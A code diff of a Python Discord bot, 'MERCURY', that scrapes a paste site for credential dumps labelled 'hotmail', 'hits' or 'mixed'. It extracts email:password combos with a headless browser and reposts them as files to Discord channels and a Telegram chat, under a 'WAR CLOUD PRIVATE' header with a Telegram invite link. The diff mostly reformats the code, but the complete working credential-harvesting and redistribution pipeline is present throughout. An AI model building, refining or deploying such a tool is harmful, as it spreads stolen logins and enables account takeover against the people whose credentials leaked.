@@ -1,6 +1,6 @@
 """
 MERCURY — Discord Bot
-Deploy on Railway. Scrapes Pasteview every 1 minute, posts to 3 channels.
+Deploy on Railway.
 """
 
 import asyncio
@@ -27,16 +27,14 @@ NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])
 CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"])
 TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
 TELEGRAM_CHAT      = os.environ["TELEGRAM_CHAT"]
+OWNER_ID           = int(os.environ["OWNER_ID"])
 
-OWNER_ID = int(os.environ["OWNER_ID"])  # your Discord user ID
-EMPTY_SCAN_ALERT = 10  # DM after this many consecutive empty scans
-
-CHECK_INTERVAL = 30
-PAGES_TO_SCAN  = 5
-ARCHIVE_URL    = "https://pasteview.com/paste-archive"
-SEEN_FILE      = "seen_urls.json"
-
-KEYWORDS = ["hotmail", "hits", "mixed"]
+CHECK_INTERVAL   = 30
+PAGES_TO_SCAN    = 5
+ARCHIVE_URL      = "https://pasteview.com/paste-archive"
+SEEN_FILE        = "seen_urls.json"
+EMPTY_SCAN_ALERT = 10
+KEYWORDS         = ["hotmail", "hits", "mixed"]
 
 # ─── LOGGING ─────────────────────────────────────────────────────────────────
 logging.basicConfig(
@@ -48,8 +46,8 @@ log = logging.getLogger("mercury")
 
 # ─── STATE ───────────────────────────────────────────────────────────────────
 start_time = time.time()
-stats = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
-scan_lock = asyncio.Lock()
+stats      = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
+scan_lock  = asyncio.Lock()
 
 def load_seen() -> set:
     if Path(SEEN_FILE).exists():
@@ -86,7 +84,6 @@ JUNK_DOMAINS   = ("t.me", "telegram.me", "telegram.dog", "discord.gg", "http://"
 VALID_EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")
 
 def is_valid_combo(line: str) -> bool:
-    """Strictly validate email:password format, reject all junk."""
     if not line or len(line) > 200:
         return False
     if "|" in line:
@@ -112,19 +109,14 @@ def extract_credentials(raw: str) -> list[str]:
     lines = []
     for line in raw.splitlines():
         line = line.strip()
-        if not line:
-            continue
-        if not is_valid_combo(line):
-            continue
-        if line in seen:
-            continue
-        seen.add(line)
-        lines.append(line)
+        if line and is_valid_combo(line) and line not in seen:
+            seen.add(line)
+            lines.append(line)
     return lines
 
 # ─── TELEGRAM ────────────────────────────────────────────────────────────────
 async def send_telegram_file(text: str, filename: str):
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+    url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
     data = aiohttp.FormData()
     data.add_field("chat_id", TELEGRAM_CHAT)
     data.add_field("document", text.encode(), filename=filename, content_type="text/plain")
@@ -141,20 +133,18 @@ async def send_telegram_file(text: str, filename: str):
 
 # ─── BOT ─────────────────────────────────────────────────────────────────────
 intents = discord.Intents.default()
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot  = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
-
 
 async def post_pastes(channel, pastes: list[dict]):
     if not pastes:
         return
     try:
-        content = "\n".join(item["url"] for item in pastes)
+        content  = "\n".join(item["url"] for item in pastes)
         filename = f"hotmail_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
         await channel.send(file=discord.File(fp=io.BytesIO(content.encode()), filename=filename))
     except Exception as e:
         log.error(f"Failed to post file: {e}")
-
 
 async def post_new_alerts(channel, pastes: list[dict]):
     for item in pastes:
@@ -164,15 +154,12 @@ async def post_new_alerts(channel, pastes: list[dict]):
         except Exception as e:
             log.error(f"Failed to post alert: {e}")
 
-
 async def extract_raw(page, url: str) -> str:
-    """Extract raw text from a paste URL with retries."""
     for attempt in range(2):
         try:
             await page.goto(url, wait_until="networkidle", timeout=15000)
             await page.wait_for_timeout(1500)
 
-            # Ace editor API
             raw = await page.evaluate("""
                 () => {
                     if (window.ace) {
@@ -191,7 +178,6 @@ async def extract_raw(page, url: str) -> str:
                 }
             """)
 
-            # Scroll fallback
             if not raw or not raw.strip():
                 await page.evaluate("""
                     () => {
@@ -201,9 +187,8 @@ async def extract_raw(page, url: str) -> str:
                 """)
                 await page.wait_for_timeout(800)
                 lines = await page.query_selector_all("div.ace_line")
-                raw = "\n".join([(await l.text_content() or "").strip() for l in lines])
+                raw   = "\n".join([(await l.text_content() or "").strip() for l in lines])
 
-            # Pre tag fallback
             if not raw or not raw.strip():
                 pre = await page.query_selector("pre")
                 if pre:
@@ -218,7 +203,6 @@ async def extract_raw(page, url: str) -> str:
                 await asyncio.sleep(2)
 
     return ""
-
 
 # ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
 @tasks.loop(seconds=CHECK_INTERVAL)
@@ -237,189 +221,186 @@ async def monitor_loop():
         stats["scans"] += 1
         log.info(f"Running scan #{stats['scans']}...")
 
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(
-            headless=True,
-            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-        )
-        page = await browser.new_page()
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(
+                headless=True,
+                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
+            )
+            page = await browser.new_page()
 
-        try:
-            # ── Step 1: scrape archive ─────────────────────────────────────
-            for attempt in range(3):
-                try:
-                    await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
-                    await page.wait_for_timeout(2000)
-                    break
-                except Exception as e:
-                    log.warning(f"Archive load attempt {attempt+1} failed: {e}")
-                    if attempt == 2:
-                        log.error("Archive failed to load after 3 attempts, skipping scan")
-                        return
-                    await asyncio.sleep(3)
-
-            found = []
-            for page_num in range(1, PAGES_TO_SCAN + 1):
-                if page_num > 1:
-                    navigated = False
-                    buttons = await page.query_selector_all("button")
-                    for btn in buttons:
-                        text = await btn.text_content()
-                        if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
-                            disabled = await btn.get_attribute("disabled")
-                            aria_dis = await btn.get_attribute("aria-disabled")
-                            if disabled is not None or aria_dis == "true":
-                                break
-                            await btn.click()
-                            await page.wait_for_timeout(2000)
-                            navigated = True
-                            break
-                    if not navigated:
+            try:
+                # ── Step 1: load archive ───────────────────────────────────
+                for attempt in range(3):
+                    try:
+                        await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
+                        await page.wait_for_timeout(2000)
                         break
+                    except Exception as e:
+                        log.warning(f"Archive load attempt {attempt+1} failed: {e}")
+                        if attempt == 2:
+                            log.error("Archive failed after 3 attempts, skipping scan")
+                            return
+                        await asyncio.sleep(3)
 
-                matches = await page.evaluate("""
-                    (keywords) => {
-                        const results = [];
-                        for (const a of document.querySelectorAll('a')) {
-                            const text = (a.innerText || a.textContent || '').toLowerCase();
-                            if (keywords.some(k => text.includes(k))) {
-                                const href = a.href;
-                                if (href
-                                    && !href.includes('/paste-archive')
-                                    && !href.includes('/new')
-                                    && !href.endsWith('/')
-                                    && href !== window.location.href) {
-                                    results.push({
-                                        title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
-                                        url: href
-                                    });
+                # ── Step 2: scrape pages ───────────────────────────────────
+                found = []
+                for page_num in range(1, PAGES_TO_SCAN + 1):
+                    if page_num > 1:
+                        navigated = False
+                        buttons   = await page.query_selector_all("button")
+                        for btn in buttons:
+                            text = await btn.text_content()
+                            if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
+                                disabled  = await btn.get_attribute("disabled")
+                                aria_dis  = await btn.get_attribute("aria-disabled")
+                                if disabled is not None or aria_dis == "true":
+                                    break
+                                await btn.click()
+                                await page.wait_for_timeout(2000)
+                                navigated = True
+                                break
+                        if not navigated:
+                            break
+
+                    matches = await page.evaluate("""
+                        (keywords) => {
+                            const results = [];
+                            for (const a of document.querySelectorAll('a')) {
+                                const text = (a.innerText || a.textContent || '').toLowerCase();
+                                if (keywords.some(k => text.includes(k))) {
+                                    const href = a.href;
+                                    if (href
+                                        && !href.includes('/paste-archive')
+                                        && !href.includes('/new')
+                                        && !href.endsWith('/')
+                                        && href !== window.location.href) {
+                                        results.push({
+                                            title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
+                                            url: href
+                                        });
+                                    }
                                 }
                             }
+                            return results;
                         }
-                        return results;
-                    }
-                """, KEYWORDS)
-                log.info(f"Page {page_num}: {len(matches)} match(es)")
-                found.extend(matches)
+                    """, KEYWORDS)
+                    log.info(f"Page {page_num}: {len(matches)} match(es)")
+                    found.extend(matches)
 
-            # Deduplicate within this run
-            seen_this_run = set()
-            pastes = []
-            for item in found:
-                if item["url"] not in seen_this_run:
-                    seen_this_run.add(item["url"])
-                    pastes.append(item)
+                # Deduplicate within this run
+                seen_this_run = set()
+                pastes        = []
+                for item in found:
+                    if item["url"] not in seen_this_run:
+                        seen_this_run.add(item["url"])
+                        pastes.append(item)
 
-            stats["total_pastes"] += len(pastes)
+                stats["total_pastes"] += len(pastes)
 
-            # ── Step 2: channel 1 — all found URLs as .txt ────────────────
-            await post_pastes(channel, pastes)
+                # ── Step 3: post all URLs to channel 1 ────────────────────
+                await post_pastes(channel, pastes)
 
-            # ── Step 3: find new pastes & mark seen immediately ───────────
-            new_pastes = [p for p in pastes if p["url"] not in posted_urls]
-            if not new_pastes:
-                stats["empty_scans"] += 1
-                log.info(f"No new pastes this run (empty streak: {stats['empty_scans']})")
-                if stats["empty_scans"] == EMPTY_SCAN_ALERT:
-                    try:
-                        owner = await bot.fetch_user(OWNER_ID)
-                        await owner.send(f"⚠️ MERCURY: No new pastes found in {EMPTY_SCAN_ALERT} consecutive scans. Something might be broken.")
-                    except Exception as e:
-                        log.error(f"Failed to DM owner: {e}")
-                return
+                # ── Step 4: filter new pastes & mark seen ─────────────────
+                new_pastes = [p for p in pastes if p["url"] not in posted_urls]
+                if not new_pastes:
+                    stats["empty_scans"] += 1
+                    log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
+                    if stats["empty_scans"] == EMPTY_SCAN_ALERT:
+                        try:
+                            owner = await bot.fetch_user(OWNER_ID)
+                            await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
+                        except Exception as e:
+                            log.error(f"Failed to DM owner: {e}")
+                    return
 
-            stats["empty_scans"] = 0
+                stats["empty_scans"] = 0
+                for p in new_pastes:
+                    posted_urls.add(p["url"])
+                save_seen(posted_urls)
+                log.info(f"{len(new_pastes)} new paste(s) detected")
 
-            for p in new_pastes:
-                posted_urls.add(p["url"])
-            save_seen(posted_urls)
+                # ── Step 5: new URL alerts to channel 2 ───────────────────
+                try:
+                    new_channel = bot.get_channel(NEW_CHANNEL_ID) or await bot.fetch_channel(NEW_CHANNEL_ID)
+                    await post_new_alerts(new_channel, new_pastes)
+                except Exception as e:
+                    log.error(f"Could not post to new channel: {e}")
 
-            log.info(f"{len(new_pastes)} new paste(s) detected")
+                # ── Step 6: extract creds & post to channel 3 ─────────────
+                try:
+                    content_channel = bot.get_channel(CONTENT_CHANNEL_ID) or await bot.fetch_channel(CONTENT_CHANNEL_ID)
+                    combined        = []
 
-            # ── Step 4: channel 2 — new URL alerts ────────────────────────
-            try:
-                new_channel = bot.get_channel(NEW_CHANNEL_ID) or await bot.fetch_channel(NEW_CHANNEL_ID)
-                await post_new_alerts(new_channel, new_pastes)
-            except Exception as e:
-                log.error(f"Could not post to new channel: {e}")
-
-            # ── Step 5: channel 3 — extract & validate creds ──────────────
-            try:
-                content_channel = bot.get_channel(CONTENT_CHANNEL_ID) or await bot.fetch_channel(CONTENT_CHANNEL_ID)
-                combined = []
-
-                for item in new_pastes[:5]:
-                    url = item["url"]
-                    log.info(f"Extracting from {url}")
-                    raw = await extract_raw(page, url)
-                    if raw:
-                        creds = extract_credentials(raw)
-                        if creds:
-                            combined.append("\n".join(creds))
-                            stats["total_combos"] += len(creds)
-                            log.info(f"✓ {len(creds)} valid combos from {url}")
+                    for item in new_pastes[:5]:
+                        url = item["url"]
+                        log.info(f"Extracting from {url}")
+                        raw = await extract_raw(page, url)
+                        if raw:
+                            creds = extract_credentials(raw)
+                            if creds:
+                                combined.append("\n".join(creds))
+                                stats["total_combos"] += len(creds)
+                                log.info(f"✓ {len(creds)} valid combos from {url}")
+                            else:
+                                log.info(f"No valid combos in {url}")
                         else:
-                            log.info(f"No valid combos in {url}")
+                            log.info(f"No content extracted from {url}")
+
+                    if combined:
+                        output      = "\n\n".join(combined)
+                        ts          = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
+                        title_lower = " ".join(p["title"].lower() for p in new_pastes)
+
+                        if "hotmail" in title_lower:
+                            label = "hotmail"
+                        elif "hits" in title_lower:
+                            label = "hits"
+                        elif "mix" in title_lower or "mixed" in title_lower:
+                            label = "mix"
+                        else:
+                            label = "content"
+
+                        filename = f"{label}_{ts}.txt"
+
+                        # Discord
+                        await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
+                        log.info(f"Posted to Discord as {filename}")
+
+                        # DM owner
+                        try:
+                            owner = await bot.fetch_user(OWNER_ID)
+                            total = sum(len(b.splitlines()) for b in combined)
+                            await owner.send(f"✅ New {label.upper()} detected — {total} combos")
+                        except Exception as e:
+                            log.error(f"Failed to DM owner: {e}")
+
+                        # Telegram
+                        all_creds = [l for b in combined for l in b.splitlines() if l.strip()]
+                        random.shuffle(all_creds)
+                        tg_header = (
+                            f"WAR CLOUD PRIVATE {label.upper()}\n"
+                            "------------------------\n"
+                            "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                            "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                            "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
+                        )
+                        await send_telegram_file(tg_header + "\n".join(all_creds), filename)
+
                     else:
-                        log.info(f"No content extracted from {url}")
+                        log.info("Nothing to post to content channel")
 
-                if combined:
-                    output = "\n\n".join(combined)
-                    ts = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
-
-                    # Determine filename based on matched keyword in any new paste title
-                    title_lower = " ".join(p["title"].lower() for p in new_pastes)
-                    if "hotmail" in title_lower:
-                        label = "hotmail"
-                    elif "hits" in title_lower:
-                        label = "hits"
-                    elif "mix" in title_lower or "mixed" in title_lower:
-                        label = "mix"
-                    else:
-                        label = "content"
-                    filename = f"{label}_{ts}.txt"
-
-                    # Discord
-                    await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
-                    log.info(f"Posted to Discord content channel as {filename}")
-
-                    # DM owner
-                    try:
-                        owner = await bot.fetch_user(OWNER_ID)
-                        total = sum(len(block.splitlines()) for block in combined)
-                        await owner.send(f"✅ New {label.upper()} detected — {total} combos")
-                    except Exception as e:
-                        log.error(f"Failed to DM owner: {e}")
-
-                    # Telegram — shuffle + header
-                    all_creds = [line for block in combined for line in block.splitlines() if line.strip()]
-                    random.shuffle(all_creds)
-                    tg_header = (
-                        f"WAR CLOUD PRIVATE {label.upper()}\n"
-                        "------------------------\n"
-                        "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                        "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                        "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
-                    )
-                    tg_output = tg_header + "\n".join(all_creds)
-                    await send_telegram_file(tg_output, filename)
-
-                else:
-                    log.info("Nothing to post to content channel")
+                except Exception as e:
+                    log.error(f"Could not post to content channel: {e}")
 
             except Exception as e:
-                log.error(f"Could not post to content channel: {e}")
-
-        except Exception as e:
-            log.error(f"Monitor loop error: {e}")
-        finally:
-            await browser.close()
+                log.error(f"Monitor loop error: {e}")
+            finally:
+                await browser.close()
 
 
 @monitor_loop.before_loop
 async def before_monitor():
     await bot.wait_until_ready()
-
 
 # ─── SLASH COMMANDS ───────────────────────────────────────────────────────────
 @tree.command(name="scrape", description="Manually trigger a scrape right now")
@@ -432,21 +413,17 @@ async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCA
 
 @tree.command(name="stats", description="Show bot stats")
 async def cmd_stats(interaction: discord.Interaction):
-    uptime_secs = int(time.time() - start_time)
-    hours, remainder = divmod(uptime_secs, 3600)
-    minutes, seconds = divmod(remainder, 60)
-    uptime_str = f"{hours}h {minutes}m {seconds}s"
-
-    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000,
-                          timestamp=datetime.now(timezone.utc))
-    embed.add_field(name="Uptime",        value=uptime_str,                   inline=True)
-    embed.add_field(name="Scans Run",     value=str(stats["scans"]),          inline=True)
-    embed.add_field(name="Pastes Found",  value=str(stats["total_pastes"]),   inline=True)
-    embed.add_field(name="Combos Found",  value=str(stats["total_combos"]),   inline=True)
-    embed.add_field(name="URLs Tracked",  value=str(len(posted_urls)),        inline=True)
-    embed.add_field(name="Check Every",   value=f"{CHECK_INTERVAL}s",         inline=True)
+    uptime_secs          = int(time.time() - start_time)
+    hours, remainder     = divmod(uptime_secs, 3600)
+    minutes, seconds     = divmod(remainder, 60)
+    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000, timestamp=datetime.now(timezone.utc))
+    embed.add_field(name="Uptime",       value=f"{hours}h {minutes}m {seconds}s", inline=True)
+    embed.add_field(name="Scans Run",    value=str(stats["scans"]),               inline=True)
+    embed.add_field(name="Pastes Found", value=str(stats["total_pastes"]),        inline=True)
+    embed.add_field(name="Combos Found", value=str(stats["total_combos"]),        inline=True)
+    embed.add_field(name="URLs Tracked", value=str(len(posted_urls)),             inline=True)
+    embed.add_field(name="Check Every",  value=f"{CHECK_INTERVAL}s",             inline=True)
     await interaction.response.send_message(embed=embed)
-
 
 # ─── EVENTS ──────────────────────────────────────────────────────────────────
 @bot.event
@@ -459,10 +436,9 @@ async def on_ready():
         log.error(f"Failed to sync commands: {e}")
     if not monitor_loop.is_running():
         monitor_loop.start()
-        log.info(f"Monitor started — checking every {CHECK_INTERVAL} second(s)")
+        log.info(f"Monitor started — checking every {CHECK_INTERVAL}s")
     else:
         log.info("Monitor already running after reconnect")
-
 
 @bot.event
 async def on_resumed():
@@ -470,7 +446,6 @@ async def on_resumed():
     if not monitor_loop.is_running():
         monitor_loop.start()
         log.info("Monitor restarted after resume")
-
 
 # ─── RUN ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
